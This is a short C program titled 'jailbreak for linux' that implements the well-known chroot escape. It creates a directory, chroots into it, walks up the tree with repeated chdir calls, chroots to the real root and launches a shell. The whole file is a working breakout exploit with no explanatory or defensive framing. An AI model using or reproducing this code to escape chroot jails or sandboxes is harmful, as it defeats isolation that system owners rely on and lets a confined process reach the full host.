/* jailbreak for linux */
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  int i;
  mkdir("breakdir", 0700);
  chroot("breakdir");
  for (i=0; i<100; i++)
    chdir("..");
  chroot(".");
  execl("/bin/sh", "/bin/sh", NULL);
}
